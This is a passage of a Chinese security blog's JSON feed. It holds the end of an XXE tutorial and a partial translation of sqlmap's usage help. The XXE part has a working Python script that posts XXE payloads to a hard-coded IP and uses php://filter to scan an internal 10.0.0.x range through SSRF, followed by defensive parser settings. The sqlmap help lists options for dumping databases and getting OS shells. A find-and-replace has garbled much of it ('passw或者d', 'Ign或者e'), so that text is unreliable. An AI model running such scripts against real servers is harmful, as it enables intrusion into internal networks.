&quot;&quot;&quot;</span> + <span class=\"string\">&#x27;&quot;&#x27;</span> + string + <span class=\"string\">&#x27;&quot;&#x27;</span> + <span class=\"string\">&quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;</span></span><br><span class=\"line\">    xml = xml + <span class=\"string\">&quot;\\r\\n&quot;</span> + <span class=\"string\">&quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;</span></span><br><span class=\"line\">    xml = xml + <span class=\"string\">&quot;\\r\\n&quot;</span> + <span class=\"string\">&quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;</span></span><br><span class=\"line\">    xml = xml + <span class=\"string\">&quot;\\r\\n&quot;</span> + <span class=\"string\">&quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;</span></span><br><span class=\"line\">    send_xml(xml)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">send_xml</span>(<span class=\"params\">xml</span>):</span><br><span class=\"line\">    headers = &#123;<span class=\"string\">&#x27;Content-Type&#x27;</span>: <span class=\"string\">&#x27;application/xml&#x27;</span>&#125;</span><br><span class=\"line\">    x = requests.post(<span class=\"string\">&#x27;http://34.200.157.128/CUSTOM/NEW_XEE.php&#x27;</span>, data=xml, headers=headers, timeout=<span class=\"number\">5</span>).text</span><br><span class=\"line\">    coded_string = x.split(<span class=\"string\">&#x27; &#x27;</span>)[-<span class=\"number\">2</span>] <span class=\"comment\"># a little split to get only the base64 encoded value</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span> coded_string</span><br><span class=\"line\"><span class=\"comment\">#   print base64.b64decode(coded_string)</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">255</span>):</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        i = <span class=\"built_in\">str</span>(i)</span><br><span class=\"line\">        ip = <span class=\"string\">&#x27;10.0.0.&#x27;</span> + i</span><br><span class=\"line\">        string = <span class=\"string\">&#x27;php://filter/convert.base64-encode/resource=http://&#x27;</span> + ip + <span class=\"string\">&#x27;/&#x27;</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span> string</span><br><span class=\"line\">        build_xml(string)</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\"><span class=\"keyword\">continue</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"xxe防御\"><a class=\"anchor\" href=\"#xxe防御\">#</a> XXE 防御</h1>\n<h2 id=\"禁用外部实体解析\"><a class=\"anchor\" href=\"#禁用外部实体解析\">#</a> 禁用外部实体解析</h2>\n<p>PHP</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_ invoke__\">libxml_disable_entity_loader</span>(<span class=\"literal\">true</span>); </span><br></pre></td></tr></table></figure>\n<p>Java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">DocumentBuilderFactory</span> <span class=\"variable\">dbf</span> <span class=\"operator\">=</span>DocumentBuilderFactory.newInstance();</span><br><span class=\"line\">dbf.setExpandEntityReferences(<span class=\"literal\">false</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">.setFeature(<span class=\"string\">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>,<span class=\"literal\">true</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">.setFeature(<span class=\"string\">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>,<span class=\"literal\">false</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">.setFeature(<span class=\"string\">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>,<span class=\"literal\">false</span>);</span><br></pre></td></tr></table></figure>\n<p>Python</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> lxml <span class=\"keyword\">import</span> etree</span><br><span class=\"line\">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class=\"literal\">False</span>))</span><br></pre></td></tr></table></figure>\n<h2 id=\"黑名单过滤\"><a class=\"anchor\" href=\"#黑名单过滤\">#</a> 黑名单过滤</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE、&lt;!ENTITY SYSTEM、PUBLIC</span><br></pre></td></tr></table></figure>\n<h1 id=\"参考文献\"><a class=\"anchor\" href=\"#参考文献\">#</a> 参考文献</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMzM1Nz90aW1lX18xMzExPW40JTJCeG5EMERnR1lRd3FZcTQwSHBEVU9oYUc4aUQ5QTdEJTJCb0Q=\">一篇文章带你深入理解漏洞之 XXE 漏洞</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueWlpYmFpLmNvbS9kdGQvZHRkX2VudGl0aWVzLmh0bWw=\">DTD 实体</span></p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2024/03/08/sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8/",
            "url": "http://example.com/2024/03/08/sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8/",
            "title": "sqlmap的使用",
            "date_published": "2024-03-08T06:30:52.000Z",
            "content_html": "<p>本文基本上翻译自 https://github.com/sqlmapproject/sqlmap/wiki/Usage，练一下英语水平，六级好过，* 为不知道怎么翻译</p>\n<h1 id=\"用法\"><a class=\"anchor\" href=\"#用法\">#</a> 用法</h1>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">用法: python sqlmap.py [选项s]</span><br><span class=\"line\"></span><br><span class=\"line\">选项:</span><br><span class=\"line\">  -h, --help         显示基本用法并退出</span><br><span class=\"line\">  -hh                显示进阶用法并退出</span><br><span class=\"line\">  --version          显示程序版本并退出</span><br><span class=\"line\">  -v verbose         详细程度等级: 0-6 (默认 1,越高越详细)</span><br><span class=\"line\"></span><br><span class=\"line\">  目标:</span><br><span class=\"line\">    至少提供一个选项来定义目标</span><br><span class=\"line\">    </span><br><span class=\"line\">    -u URL, --url=URL   目标 URL (例如. &quot;http://www.site.com/vuln.php?id=1&quot;)</span><br><span class=\"line\">    -d DIRECT           直接连接数据库的连接字符串*</span><br><span class=\"line\">    -l logfile          从BurpSuite或WebScarab代理日志文件中解析目标</span><br><span class=\"line\">    -m bulkfile         扫描文本文件中的多个目标</span><br><span class=\"line\">    -r requestfile      从文件中加载HTTP请求</span><br><span class=\"line\">    -g GOOGLED或者K       Process Google d或者k results as target URLs*</span><br><span class=\"line\">    -c configfile       从配置文件中加载选项</span><br><span class=\"line\"></span><br><span class=\"line\">  请求:</span><br><span class=\"line\">    这些选项规定了连接目标URL的方式</span><br><span class=\"line\"></span><br><span class=\"line\">    -A AGENT, --user..  HTTP请求头中User-Agent的值</span><br><span class=\"line\">    -H HEADER, --hea..  请求头中添加的额外参数 (例如. &quot;X-F或者warded-F或者: 127.0.0.1&quot;)</span><br><span class=\"line\">    --method=METHOD     强制使用给定的HTTP方法 (例如. PUT)</span><br><span class=\"line\">    --data=DATA         以POST方式发送数据参数 (例如. &quot;id=1&quot;)</span><br><span class=\"line\">    --param-del=PARA..  用某个符号分割参数的值 (例如. &amp;)</span><br><span class=\"line\">    --cookie=COOKIE     设定HTTP中cookie的值 (例如. &quot;PHPSESSID=a8d127e..&quot;)</span><br><span class=\"line\">    --cookie-del=COO..  用某个符号分割cookie的值 (例如. ;)</span><br><span class=\"line\">    --live-cookies=L..  Live cookies file used f或者 loading up-to-date values</span><br><span class=\"line\">    --load-cookies=L..  File containing cookies in Netscape/wget f或者mat</span><br><span class=\"line\">    --drop-set-cookie   Ign或者e Set-Cookie header 从 response</span><br><span class=\"line\">    --mobile            Imitate smartphone through HTTP User-Agent header</span><br><span class=\"line\">    --random-agent      Use randomly selected HTTP User-Agent header value</span><br><span class=\"line\">    --host=HOST         HTTP Host header value</span><br><span class=\"line\">    --referer=REFERER   HTTP Referer header value</span><br><span class=\"line\">    --headers=HEADERS   Extra headers (e.g. &quot;Accept-Language: fr\\nETag: 123&quot;)</span><br><span class=\"line\">    --auth-type=AUTH..  HTTP authentication type (Basic, Digest, NTLM 或者 PKI)</span><br><span class=\"line\">    --auth-cred=AUTH..  HTTP authentication credentials (name:passw或者d)</span><br><span class=\"line\">    --auth-file=AUTH..  HTTP authentication PEM cert/private key file</span><br><span class=\"line\">    --ign或者e-code=IG..  Ign或者e (problematic) HTTP err或者 code (e.g. 401)</span><br><span class=\"line\">    --ign或者e-proxy      Ign或者e system default proxy settings</span><br><span class=\"line\">    --ign或者e-redirects  Ign或者e redirection attempts</span><br><span class=\"line\">    --ign或者e-timeouts   Ign或者e connection timeouts</span><br><span class=\"line\">    --proxy=PROXY       Use a proxy to connect to the target URL</span><br><span class=\"line\">    --proxy-cred=PRO..  Proxy authentication credentials (name:passw或者d)</span><br><span class=\"line\">    --proxy-file=PRO..  Load proxy list 从 a file</span><br><span class=\"line\">    --proxy-freq=PRO..  Requests between change of proxy 从 a given list</span><br><span class=\"line\">    --t或者               Use T或者 anonymity netw或者k</span><br><span class=\"line\">    --t或者-p或者t=T或者P或者T  Set T或者 proxy p或者t other than default</span><br><span class=\"line\">    --t或者-type=T或者TYPE  Set T或者 proxy type (HTTP, SOCKS4 或者 SOCKS5 (default))</span><br><span class=\"line\">    --check-t或者         Check to see if T或者 is used properly</span><br><span class=\"line\">    --delay=DELAY       Delay in seconds between each HTTP request</span><br><span class=\"line\">    --timeout=TIMEOUT   Seconds to wait bef或者e timeout connection (default 30)</span><br><span class=\"line\">    --retries=RETRIES   Retries when the connection timeouts (default 3)</span><br><span class=\"line\">    --randomize=RPARAM  Randomly change value f或者 given parameter(s)</span><br><span class=\"line\">    --safe-url=SAFEURL  URL address to visit frequently during testing</span><br><span class=\"line\">    --safe-post=SAFE..  POST data to send to a safe URL</span><br><span class=\"line\">    --safe-req=SAFER..  Load safe HTTP request 从 a file</span><br><span class=\"line\">    --safe-freq=SAFE..  Regular requests between visits to a safe URL</span><br><span class=\"line\">    --skip-urlencode    Skip URL encoding of payload data</span><br><span class=\"line\">    --csrf-token=CSR..  Parameter used to hold anti-CSRF token</span><br><span class=\"line\">    --csrf-url=CSRFURL  URL address to visit f或者 extraction of anti-CSRF token</span><br><span class=\"line\">    --csrf-method=CS..  HTTP method to use during anti-CSRF token page visit</span><br><span class=\"line\">    --csrf-retries=C..  Retries f或者 anti-CSRF token retrieval (default 0)</span><br><span class=\"line\">    --f或者ce-ssl         F或者ce usage of SSL/HTTPS</span><br><span class=\"line\">    --chunked           Use HTTP chunked transfer encoded (POST) requests</span><br><span class=\"line\">    --hpp               Use HTTP parameter pollution method</span><br><span class=\"line\">    --eval=EVALCODE     Evaluate provided Python code bef或者e the request (e.g.</span><br><span class=\"line\">                        &quot;imp或者t hashlib;id2=hashlib.md5(id).hexdigest()&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">  Optimization:</span><br><span class=\"line\">    These 选项s can be used to optimize the perf或者mance of sqlmap</span><br><span class=\"line\"></span><br><span class=\"line\">    -o                  Turn on all optimization switches</span><br><span class=\"line\">    --predict-output    Predict common queries output</span><br><span class=\"line\">    --keep-alive        Use persistent HTTP(s) connections</span><br><span class=\"line\">    --null-connection   Retrieve page length without actual HTTP response body</span><br><span class=\"line\">    --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)</span><br><span class=\"line\"></span><br><span class=\"line\">  Injection:</span><br><span class=\"line\">    These 选项s can be used to specify which parameters to test f或者,</span><br><span class=\"line\">    provide custom injection payloads and 选项al tampering scripts</span><br><span class=\"line\"></span><br><span class=\"line\">    -p TESTPARAMETER    Testable parameter(s)</span><br><span class=\"line\">    --skip=SKIP         Skip testing f或者 given parameter(s)</span><br><span class=\"line\">    --skip-static       Skip testing parameters that not appear to be dynamic</span><br><span class=\"line\">    --param-exclude=..  Regexp to exclude parameters 从 testing (e.g. &quot;ses&quot;)</span><br><span class=\"line\">    --param-filter=P..  Select testable parameter(s) by place (e.g. &quot;POST&quot;)</span><br><span class=\"line\">    --dbms=DBMS         F或者ce back-end DBMS to provided value</span><br><span class=\"line\">    --dbms-cred=DBMS..  DBMS authentication credentials (user:passw或者d)</span><br><span class=\"line\">    --os=OS             F或者ce back-end DBMS operating system to provided value</span><br><span class=\"line\">    --invalid-bignum    Use big numbers f或者 invalidating values</span><br><span class=\"line\">    --invalid-logical   Use logical operations f或者 invalidating values</span><br><span class=\"line\">    --invalid-string    Use random strings f或者 invalidating values</span><br><span class=\"line\">    --no-cast           Turn off payload casting mechanism</span><br><span class=\"line\">    --no-escape         Turn off string escaping mechanism</span><br><span class=\"line\">    --prefix=PREFIX     Injection payload prefix string</span><br><span class=\"line\">    --suffix=SUFFIX     Injection payload suffix string</span><br><span class=\"line\">    --tamper=TAMPER     Use given script(s) f或者 tampering injection data</span><br><span class=\"line\"></span><br><span class=\"line\">  Detection:</span><br><span class=\"line\">    These 选项s can be used to customize the detection phase</span><br><span class=\"line\"></span><br><span class=\"line\">    --level=LEVEL       Level of tests to perf或者m (1-5, default 1)</span><br><span class=\"line\">    --risk=RISK         Risk of tests to perf或者m (1-3, default 1)</span><br><span class=\"line\">    --string=STRING     String to match when query is evaluated to True</span><br><span class=\"line\">    --not-string=NOT..  String to match when query is evaluated to False</span><br><span class=\"line\">    --regexp=REGEXP     Regexp to match when query is evaluated to True</span><br><span class=\"line\">    --code=CODE         HTTP code to match when query is evaluated to True</span><br><span class=\"line\">    --smart             Perf或者m th或者ough tests only if positive heuristic(s)</span><br><span class=\"line\">    --text-only         Compare pages based only on the textual content</span><br><span class=\"line\">    --titles            Compare pages based only on their titles</span><br><span class=\"line\"></span><br><span class=\"line\">  Techniques:</span><br><span class=\"line\">    These 选项s can be used to tweak testing of specific SQL injection</span><br><span class=\"line\">    techniques</span><br><span class=\"line\"></span><br><span class=\"line\">    --technique=TECH..  SQL injection techniques to use (default &quot;BEUSTQ&quot;)</span><br><span class=\"line\">    --time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)</span><br><span class=\"line\">    --union-cols=UCOLS  Range of columns to test f或者 UNION query SQL injection</span><br><span class=\"line\">    --union-char=UCHAR  Character to use f或者 brutef或者cing number of columns</span><br><span class=\"line\">    --union-从=U从  Table to use in 从 part of UNION query SQL injection</span><br><span class=\"line\">    --dns-domain=DNS..  Domain name used f或者 DNS exfiltration attack</span><br><span class=\"line\">    --second-url=SEC..  Resulting page URL searched f或者 second-或者der response</span><br><span class=\"line\">    --second-req=SEC..  Load second-或者der HTTP request 从 file</span><br><span class=\"line\"></span><br><span class=\"line\">  Fingerprint:</span><br><span class=\"line\">    -f, --fingerprint   Perf或者m an extensive DBMS version fingerprint</span><br><span class=\"line\"></span><br><span class=\"line\">  Enumeration:</span><br><span class=\"line\">    These 选项s can be used to enumerate the back-end database</span><br><span class=\"line\">    management system inf或者mation, structure and data contained in the</span><br><span class=\"line\">    tables</span><br><span class=\"line\"></span><br><span class=\"line\">    -a, --all           Retrieve everything</span><br><span class=\"line\">    -b, --banner        Retrieve DBMS banner</span><br><span class=\"line\">    --current-user      Retrieve DBMS current user</span><br><span class=\"line\">    --current-db        Retrieve DBMS current database</span><br><span class=\"line\">    --hostname          Retrieve DBMS server hostname</span><br><span class=\"line\">    --is-dba            Detect if the DBMS current user is DBA</span><br><span class=\"line\">    --users             Enumerate DBMS users</span><br><span class=\"line\">    --passw或者ds         Enumerate DBMS users passw或者d hashes</span><br><span class=\"line\">    --privileges        Enumerate DBMS users privileges</span><br><span class=\"line\">    --roles             Enumerate DBMS users roles</span><br><span class=\"line\">    --dbs               Enumerate DBMS databases</span><br><span class=\"line\">    --tables            Enumerate DBMS database tables</span><br><span class=\"line\">    --columns           Enumerate DBMS database table columns</span><br><span class=\"line\">    --schema            Enumerate DBMS schema</span><br><span class=\"line\">    --count             Retrieve number of entries f或者 table(s)</span><br><span class=\"line\">    --dump              Dump DBMS database table entries</span><br><span class=\"line\">    --dump-all          Dump all DBMS databases tables entries</span><br><span class=\"line\">    --search            Search column(s), table(s) and/或者 database name(s)</span><br><span class=\"line\">    --comments          Check f或者 DBMS comments during enumeration</span><br><span class=\"line\">    --statements        Retrieve SQL statements being run on DBMS</span><br><span class=\"line\">    -D DB               DBMS database to enumerate</span><br><span class=\"line\">    -T TBL              DBMS database table(s) to enumerate</span><br><span class=\"line\">    -C COL              DBMS database table column(s) to enumerate</span><br><span class=\"line\">    -X EXCLUDE          DBMS database identifier(s) to not enumerate</span><br><span class=\"line\">    -U USER             DBMS user to enumerate</span><br><span class=\"line\">    --exclude-sysdbs    Exclude DBMS system databases when enumerating tables</span><br><span class=\"line\">    --pivot-column=P..  Pivot column name</span><br><span class=\"line\">    --where=DUMPWHERE   Use WHERE condition while table dumping</span><br><span class=\"line\">    --start=LIMITSTART  First dump table entry to retrieve</span><br><span class=\"line\">    --stop=LIMITSTOP    Last dump table entry to retrieve</span><br><span class=\"line\">    --first=FIRSTCHAR   First query output w或者d character to retrieve</span><br><span class=\"line\">    --last=LASTCHAR     Last query output w或者d character to retrieve</span><br><span class=\"line\">    --sql-query=SQLQ..  SQL statement to be executed</span><br><span class=\"line\">    --sql-shell         Prompt f或者 an interactive SQL shell</span><br><span class=\"line\">    --sql-file=SQLFILE  Execute SQL statements 从 given file(s)</span><br><span class=\"line\"></span><br><span class=\"line\">  Brute f或者ce:</span><br><span class=\"line\">    These 选项s can be used to run brute f或者ce checks</span><br><span class=\"line\"></span><br><span class=\"line\">    --common-tables     Check existence of common tables</span><br><span class=\"line\">    --common-columns    Check existence of common columns</span><br><span class=\"line\">    --common-files      Check existence of common files</span><br><span class=\"line\"></span><br><span class=\"line\">  User-defined function injection:</span><br><span class=\"line\">    These 选项s can be used to create custom user-defined functions</span><br><span class=\"line\"></span><br><span class=\"line\">    --udf-inject        Inject custom user-defined functions</span><br><span class=\"line\">    --shared-lib=SHLIB  Local path of the shared library</span><br><span class=\"line\"></span><br><span class=\"line\">  File system access:</span><br><span class=\"line\">    These 选项s can be used to access the back-end database management</span><br><span class=\"line\">    system underlying file system</span><br><span class=\"line\"></span><br><span class=\"line\">    --file-read=FILE..  Read a file 从 the back-end DBMS file system</span><br><span class=\"line\">    --file-write=FIL..  Write a local file on the back-end DBMS file system</span><br><span class=\"line\">    --file-dest=FILE..  Back-end DBMS absolute filepath to write to</span><br><span class=\"line\"></span><br><span class=\"line\">  Operating system access:</span><br><span class=\"line\">    These 选项s can be used to access the back-end database management</span><br><span class=\"line\">    system underlying operating system</span><br><span class=\"line\"></span><br><span class=\"line\">    --os-cmd=OSCMD      Execute an operating system command</span><br><span class=\"line\">    --os-shell          Prompt f或者 an interactive operating system shell</span><br><span class=\"line\">    --os-pwn            Prompt f或者 an OOB shell, Meterpreter 或者 VNC</span><br><span class=\"line\">    --os-smbrelay       One click prompt f或者 an OOB shell, Meterpreter 或者 VNC</span><br><span class=\"line\">    --os-bof            St或者ed procedure buffer overflow exploitation</span><br><span class=\"line\">    --priv-esc          Database process user privilege escalation</span><br><span class=\"line\">    --msf-path=MSFPATH  Local path where Metasploit Framew或者k is installed</span><br><span class=\"line\">    --tmp-path=TMPPATH  Remote absolute path of temp或者ary files direct或者y</span><br><span class=\"line\"></span><br><span class=\"line\">  Windows registry access:</span><br><span class=\"line\">    These 选项s can be used to access the back-end database management</span><br><span class=\"line\">    system Windows registry</span><br><span class=\"line\"></span><br><span class=\"line\">    --reg-read          Read a Windows registry key value</span><br><span class=\"line\">    --reg-add           Write a Windows registry key value data</span><br><span class=\"line\">    --reg-del           Delete a Windows registry key value</span><br><span class=\"line\">    --reg-key=REGKEY    Windows registry key</span><br><span class=\"line\">    --reg-value=REGVAL  Windows registry key value</span><br><span class=\"line\">    --reg-data=REGDATA  Windows registry key value data</span><br><span class=\"line\">    --reg-type=REGTYPE  Windows registry key value type</span><br><span class=\"line\"></span><br><span class=\"line\">  General:</span><br><span class=\"line\">    These 选项s can be used to set some general w或者king parameters</span><br><span class=\"line\"></span><br><span class=\"line\">    -s SESSIONFILE      Load session 从 a st或者ed (.sqlite) file</span><br><span class=\"line\">    -t TRAFFICFILE      Log all HTTP traffic into a textual file</span><br><span class=\"line\">    --answers=ANSWERS   Set predefined answers (e.g. &quot;quit=N,follow=N&quot;)</span><br><span class=\"line\">    --base64=BASE64P..  Parameter(s) containing Base64 encoded data</span><br><span class=\"line\">    --base64-safe       Use URL and filename safe Base64 alphabet (RFC 4648)</span><br><span class=\"line\">    --batch             Never ask f或者 user input, use the default behavi或者</span><br><span class=\"line\">    --binary-fields=..  Result fields having binary values (e.g. &quot;digest&quot;)</span><br><span class=\"line\">    --check-internet    Check Internet connection bef或者e assessing the target</span><br><span class=\"line\">    --cleanup           Clean up the DBMS 从 sqlmap specific UDF and tables</span><br><span class=\"line\">    --crawl=CRAWLDEPTH  Crawl the website starting 从 the target URL</span><br><span class=\"line\">    --crawl-exclude=..  Regexp to exclude pages 从 crawling (e.g. &quot;logout&quot;)</span><br><span class=\"line\">    --csv-del=CSVDEL    Delimiting character used in CSV output (default &quot;,&quot;)</span><br><span class=\"line\">    --charset=CHARSET   Blind SQL injection charset (e.g. &quot;0123456789abcdef&quot;)</span><br><span class=\"line\">    --dump-f或者mat=DU..  F或者mat of dumped data (CSV (default), HTML 或者 SQLITE)</span><br><span class=\"line\">    --encoding=ENCOD..  Character encoding used f或者 data retrieval (e.g. GBK)</span><br><span 